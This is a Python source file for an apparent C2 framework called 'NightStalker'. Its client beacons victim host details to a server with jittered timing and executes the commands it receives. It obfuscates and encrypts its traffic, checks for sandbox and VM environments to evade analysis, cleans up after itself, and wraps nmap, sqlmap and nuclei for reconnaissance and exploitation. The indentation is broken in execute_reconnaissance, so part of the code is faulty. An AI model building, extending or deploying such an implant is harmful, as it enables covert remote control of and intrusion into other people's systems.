"""
NightStalker C2 Command and Control
Advanced stealth C2 server and client implementation
"""

import os
import sys
import time
import json
import base64
import hashlib
import threading
import logging
import random
import string
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime, timedelta
import platform
import subprocess
import tempfile
import shutil

from nightstalker.utils.tool_manager import ToolManager

# Configure stealth logging
logging.basicConfig(level=logging.ERROR)  # Minimize logging
logger = logging.getLogger(__name__)

class StealthConfig:
    """Stealth configuration for C2 operations"""
    
    def __init__(self):
        self.jitter_range = (5, 15)  # Random delay range in seconds
        self.beacon_interval = 30  # Base beacon interval
        self.max_payload_size = 512  # Max DNS query size
        self.encryption_enabled = True
        self.compression_enabled = True
        self.obfuscation_enabled = True
        self.anti_analysis = True
        self.process_injection = False
        self.memory_only = False
        self.cleanup_on_exit = True

class C2Client:
    """Advanced stealth C2 client"""
    
    def __init__(self, config: Optional[StealthConfig] = None):
        self.config = config or StealthConfig()
        self.running = False
        self.session_id = self._generate_session_id()
        self.last_beacon = 0
        self.command_history = []
        self.channels = {}
        self._setup_stealth()
        # Initialize required tools
        self._init_tools()

    def _init_tools(self):
        """Initialize and check required external tools"""
        required_tools = ['nmap', 'nuclei', 'sqlmap', 'ffuf', 'gobuster', 'nikto', 'wpscan']
        logger.info("Checking required tools for C2 operations...")
        ToolManager.check_and_install_tools(required_tools, logger)
    
    def _generate_session_id(self) -> str:
        """Generate unique session identifier"""
        hostname = platform.node()
        username = os.getenv('USERNAME') or os.getenv('USER', 'unknown')
        timestamp = str(int(time.time()))
        data = f"{hostname}:{username}:{timestamp}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
    
    def _setup_stealth(self):
        """Setup stealth measures"""
        if self.config.anti_analysis:
            self._check_analysis_environment()
        
        if self.config.memory_only:
            self._setup_memory_execution()
    
    def _check_analysis_environment(self) -> bool:
        """Check for analysis/sandbox environment"""
        analysis_indicators = [
            'VIRTUALBOX', 'VMWARE', 'QEMU', 'XEN',
            'SANDBOX', 'ANALYSIS', 'DEBUG', 'TEST'
        ]
        
        # Check environment variables
        for var in os.environ:
            if any(indicator in os.environ[var].upper() for indicator in analysis_indicators):
                logger.warning(f"Analysis environment detected: {var}")
                return True
        
        # Check hostname
        hostname = platform.node().upper()
        if any(indicator in hostname for indicator in analysis_indicators):
            logger.warning(f"Analysis hostname detected: {hostname}")
            return True
        
        # Check running processes
        try:
            processes = subprocess.check_output(['tasklist'] if platform.system() == 'Windows' else ['ps', 'aux'], 
                                              stderr=subprocess.DEVNULL).decode()
            if any(indicator in processes.upper() for indicator in analysis_indicators):
                logger.warning("Analysis processes detected")
                return True
        except:
            pass
        
        return False
    
    def _setup_memory_execution(self):
        """Setup memory-only execution"""
        # Create temporary directory in memory if possible
        try:
            self.temp_dir = tempfile.mkdtemp(prefix='ns_')
        except:
            self.temp_dir = None
    
    def _obfuscate_data(self, data: str) -> str:
        """Obfuscate data for transmission"""
        if not self.config.obfuscation_enabled:
            return data
        
        # Simple XOR obfuscation with random key
        key = random.randint(1, 255)
        obfuscated = []
        for char in data:
            obfuscated.append(chr(ord(char) ^ key))
        
        # Encode with base64 and add key
        result = base64.b64encode(''.join(obfuscated).encode()).decode()
        return f"{key:03d}{result}"
    
    def _deobfuscate_data(self, data: str) -> str:
        """Deobfuscate received data"""
        if not self.config.obfuscation_enabled:
            return data
        
        try:
            # Extract key and data
            key = int(data[:3])
            encoded_data = data[3:]
            
            # Decode base64
            obfuscated = base64.b64decode(encoded_data).decode()
            
            # XOR deobfuscation
            result = []
            for char in obfuscated:
                result.append(chr(ord(char) ^ key))
            
            return ''.join(result)
        except:
            return data
    
    def _compress_data(self, data: str) -> str:
        """Compress data if enabled"""
        if not self.config.compression_enabled:
            return data
        
        try:
            import zlib
            compressed = zlib.compress(data.encode())
            return base64.b64encode(compressed).decode()
        except:
            return data
    
    def _decompress_data(self, data: str) -> str:
        """Decompress data if enabled"""
        if not self.config.compression_enabled:
            return data
        
        try:
            import zlib
            compressed = base64.b64decode(data.encode())
            return zlib.decompress(compressed).decode()
        except:
            return data
    
    def _encrypt_data(self, data: str, key: str) -> str:
        """Encrypt data if enabled"""
        if not self.config.encryption_enabled:
            return data
        
        try:
            from cryptography.fernet import Fernet
            # Use session key for encryption
            session_key = hashlib.sha256(key.encode()).digest()
            fernet = Fernet(base64.b64encode(session_key))
            encrypted = fernet.encrypt(data.encode())
            return base64.b64encode(encrypted).decode()
        except:
            return data
    
    def _decrypt_data(self, data: str, key: str) -> str:
        """Decrypt data if enabled"""
        if not self.config.encryption_enabled:
            return data
        
        try:
            from cryptography.fernet import Fernet
            session_key = hashlib.sha256(key.encode()).digest()
            fernet = Fernet(base64.b64encode(session_key))
            encrypted = base64.b64decode(data.encode())
            return fernet.decrypt(encrypted).decode()
        except:
            return data
    
    def _generate_beacon(self) -> Dict[str, Any]:
        """Generate stealth beacon data"""
        beacon = {
            'session_id': self.session_id,
            'timestamp': int(time.time()),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME') or os.getenv('USER', 'unknown'),
            'os': platform.system(),
            'arch': platform.machine(),
            'pid': os.getpid(),
            'uptime': int(time.time() - self.last_beacon) if self.last_beacon else 0
        }
        
        # Add random jitter to avoid pattern detection
        jitter = random.randint(*self.config.jitter_range)
        beacon['jitter'] = jitter
        
        return beacon
    
    def _execute_command(self, command: str) -> Dict[str, Any]:
        """Execute command with proper validation and sanitization"""
        try:
            # Validate and sanitize command
            if not self._is_safe_command(command):
                return {
                    'success': False,
                    'error': 'Command contains unsafe characters or patterns',
                    'return_code': -1
                }
            
            # Split command into parts for safe execution
            import shlex
            parts = shlex.split(command)
            
            # Check for dangerous commands
            dangerous_commands = ['rm', 'del', 'format', 'dd', 'mkfs', 'fdisk', 'shutdown', 'reboot', 'halt']
            if any(cmd in parts[0].lower() for cmd in dangerous_commands):
                return {
                    'success': False,
                    'error': 'Dangerous command blocked',
                    'return_code': -1
                }
            
            # Execute command safely without shell=True
            result = subprocess.run(parts, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Command timeout',
                'return_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'return_code': -1
            }

    def _is_tool_command(self, command: str) -> bool:
        """Check if command is a special tool command"""
        tool_commands = ['nmap', 'nuclei', 'sqlmap', 'ffuf', 'gobuster', 'nikto', 'wpscan']
        return any(tool in command.lower() for tool in tool_commands)

    def _execute_tool_command(self, command: str) -> Dict[str, Any]:
        """Execute command using external security tools"""
        try:
            # Parse command to determine tool and arguments
            parts = command.split()
            tool = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            
            # Check if tool is installed
            tool_manager = ToolManager()
            if not tool_manager.is_tool_installed(tool_name=tool):
                return {
                    'success': False,
                    'error': f'Tool {tool} not installed',
                    'return_code': -1
                }
            
            # Execute tool with appropriate timeout
            timeout = 300 if tool in ['nmap', 'sqlmap'] else 120
            
            logger.info(f"Executing tool command: {command}")
            result = subprocess.run(parts, capture_output=True, text=True, timeout=timeout)
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'tool': tool
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': f'Tool command timeout: {tool}',
                'return_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Tool execution failed: {str(e)}',
                'return_code': -1
            }

    def _is_safe_command(self, command: str) -> bool:
        """Validate command for safety"""
        # Check for dangerous patterns
        dangerous_patterns = [
            '&&', '||', ';', '|', '>', '<', '`', '$(',
            'eval', 'exec', 'system', 'os.system',
            'subprocess', 'import', 'from', 'class',
            'def ', 'lambda', 'globals', 'locals'
        ]
        
        command_lower = command.lower()
        for pattern in dangerous_patterns:
            if pattern in command_lower:
                return False
        
        # Check for file path traversal
        if '..' in command or '~' in command:
            return False
        
        # Check for absolute paths (only allow relative or system commands)
        if command.startswith('/') or command.startswith('\\'):
            return False
        
        return True

    def execute_reconnaissance(self, target: str, scan_type: str = 'basic') -> Dict[str, Any]:
        """Execute reconnaissance using external tools"""
        try:
            if scan_type == 'basic':
                # Basic port scan with nmap
                            tool_manager = ToolManager()
            if not tool_manager.is_tool_installed(tool_name='nmap'):
                return {'success': False, 'error': 'Nmap not installed'}
                
                cmd = ['nmap', '-sS', '-sV', '-O', '--top-ports', '100', target]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
                
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'scan_type': 'nmap_basic',
                    'target': target
                }
                
            elif scan_type == 'web':
                # Web vulnerability scan with nuclei
                if not tool_manager.is_tool_installed(tool_name='nuclei'):
                    return {'success': False, 'error': 'Nuclei not installed'}
                
                cmd = ['nuclei', '-u', target, '-silent', '-json']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'scan_type': 'nuclei_web',
                    'target': target
                }
                
            elif scan_type == 'directory':
                # Directory enumeration with ffuf
                if not tool_manager.is_tool_installed(tool_name='ffuf'):
                    return {'success': False, 'error': 'FFuF not installed'}
                
                cmd = ['ffuf', '-u', f'{target}/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200,301,302,403']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'scan_type': 'ffuf_directory',
                    'target': target
                }
                
            else:
                return {'success': False, 'error': f'Unknown scan type: {scan_type}'}
                
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': f'Reconnaissance timeout: {scan_type}'}
        except Exception as e:
            return {'success': False, 'error': f'Reconnaissance failed: {str(e)}'}

    def execute_exploitation(self, target: str, exploit_type: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute exploitation using external tools"""
        try:
            tool_manager = ToolManager()
            if exploit_type == 'sqlmap':
                if not tool_manager.is_tool_installed(tool_name='sqlmap'):
                    return {'success': False, 'error': 'SQLMap not installed'}
                
                cmd = ['sqlmap', '-u', target, '--batch', '--random-agent', '--level=1', '--risk=1']
                if payload is not None:
                    cmd.extend(['--data', payload])
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
                
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'exploit_type': 'sqlmap',
                    'target': target
                }
                
            elif exploit_type == 'nuclei':
                if not tool_manager.is_tool_installed(tool_name='nuclei'):
                    return {'success': False, 'error': 'Nuclei not installed'}
                
                cmd = ['nuclei', '-u', target, '-silent', '-json']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'exploit_type': 'nuclei',
                    'target': target
                }
                
            else:
                return {'success': False, 'error': f'Unknown exploit type: {exploit_type}'}
                
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': f'Exploitation timeout: {exploit_type}'}
        except Exception as e:
            return {'success': False, 'error': f'Exploitation failed: {str(e)}'}
    
    def add_channel(self, name: str, channel):
        """Add communication channel"""
        self.channels[name] = channel
    
    def start(self):
        """Start C2 client"""
        self.running = True
        logger.info(f"Starting C2 client with session ID: {self.session_id}")
        
        while self.running:
            try:
                # Generate beacon
                beacon = self._generate_beacon()
                beacon_data = json.dumps(beacon)
                
                # Apply stealth measures
                if self.config.compression_enabled:
                    beacon_data = self._compress_data(beacon_data)
                
                if self.config.obfuscation_enabled:
                    beacon_data = self._obfuscate_data(beacon_data)
                
                # Send beacon through available channels
                for channel_name, channel in self.channels.items():
                    try:
                        response = channel.send(beacon_data)
                        if response:
                            # Process response
                            self._process_response(response)
                            break
                    except Exception as e:
                        logger.debug(f"Channel {channel_name} failed: {e}")
                
                # Update last beacon time
                self.last_beacon = time.time()
                
                # Sleep with jitter
                sleep_time = self.config.beacon_interval + random.randint(*self.config.jitter_range)
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.error(f"C2 client error: {e}")
                time.sleep(5)
        
        self._cleanup()
    
    def _process_response(self, response: str):
        """Process C2 response"""
        try:
            # Deobfuscate and decompress
            if self.config.obfuscation_enabled:
                response = self._deobfuscate_data(response)
            
            if self.config.compression_enabled:
                response = self._decompress_data(response)
            
            # Parse response
            data = json.loads(response)
            
            if 'command' in data:
                # Execute command
                result = self._execute_command(data['command'])
                
                # Send result back
                result_data = json.dumps(result)
                if self.config.compression_enabled:
                    result_data = self._compress_data(result_data)
                if self.config.obfuscation_enabled:
                    result_data = self._obfuscate_data(result_data)
                
                # Send through channels
                for channel in self.channels.values():
                    try:
                        channel.send(result_data)
                        break
                    except:
                        continue
            
        except Exception as e:
            logger.error(f"Failed to process response: {e}")
    
    def stop(self):
        """Stop C2 client"""
        self.running = False
    
    def _cleanup(self):
        """Cleanup on exit"""
        if self.config.cleanup_on_exit:
            # Clear command history
            self.command_history.clear()
            
            # Remove temporary files
            if hasattr(self, 'temp_dir') and self.temp_dir:
                try:
                    shutil.rmtree(self.temp_dir)
                except:
                    pass

class C2Server:
    """Advanced stealth C2 server"""
    
    def __init__(self, config: Optional[StealthConfig] = None):
        self.config = config or StealthConfig()
        self.running = False
        self.sessions = {}
        self.commands = {}
        self.channels = {}
        self._setup_stealth()
    
    def _setup_stealth(self):
        """Setup server stealth measures"""
        # Similar to client but for server-side
        pass
    
    def add_channel(self, name: str, channel):
        """Add communication channel"""
        self.channels[name] = channel
    
    def register_session(self, session_id: str, session_data: Dict[str, Any]):
        """Register new client session"""
        self.sessions[session_id] = {
            'data': session_data,
            'last_seen': time.time(),
            'commands': []
        }
        logger.info(f"New session registered: {session_id}")
    
    def send_command(self, session_id: str, command: str) -> bool:
        """Send command to specific session"""
        if session_id not in self.sessions:
            return False
        
        command_id = hashlib.sha256(f"{session_id}:{command}:{time.time()}".encode()).hexdigest()[:8]
        
        self.commands[command_id] = {
            'session_id': session_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        
        # Send through channels
        for channel in self.channels.values():
            try:
                channel.send_command(session_id, command)
                return True
            except:
                continue
        
        return False
    
    def start(self):
        """Start C2 server"""
        self.running = True
        logger.info("Starting C2 server")
        
        # Start channel listeners
        for channel_name, channel in self.channels.items():
            try:
                channel.start_listening(self._handle_beacon)
            except Exception as e:
                logger.error(f"Failed to start channel {channel_name}: {e}")
        
        # Main server loop
        while self.running:
            try:
                # Clean up old sessions
                self._cleanup_sessions()
                
                # Process pending commands
                self._process_commands()
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.error(f"C2 server error: {e}")
                time.sleep(5)
        
        self._cleanup()
    
    def _handle_beacon(self, beacon_data: str, channel_name: str):
        """Handle incoming beacon"""
        try:
            # Parse beacon data
            beacon = json.loads(beacon_data)
            session_id = beacon['session_id']
            
            # Register or update session
            self.register_session(session_id, beacon)
            
            # Check for pending commands
            pending_commands = [cmd for cmd in self.commands.values() 
                              if cmd['session_id'] == session_id and cmd['status'] == 'pending']
            
            if pending_commands:
                # Send oldest pending command
                command = pending_commands[0]
                command['status'] = 'sent'
                
                response = {
                    'command': command['command'],
                    'command_id': command.get('command_id', '')
                }
                
                # Send through channel
                self.channels[channel_name].send_response(response)
            
        except Exception as e:
            logger.error(f"Failed to handle beacon: {e}")
    
    def _cleanup_sessions(self):
        """Clean up old sessions"""
        current_time = time.time()
        timeout = 300  # 5 minutes
        
        expired_sessions = []
        for session_id, session in self.sessions.items():
            if current_time - session['last_seen'] > timeout:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            del self.sessions[session_id]
            logger.info(f"Session expired: {session_id}")
    
    def _process_commands(self):
        """Process command results"""
        # Implementation for processing command results
        pass
    
    def stop(self):
        """Stop C2 server"""
        self.running = False
    
    def _cleanup(self):
        """Cleanup on exit"""
        for channel in self.channels.values():
            try:
                channel.stop()
            except:
                pass 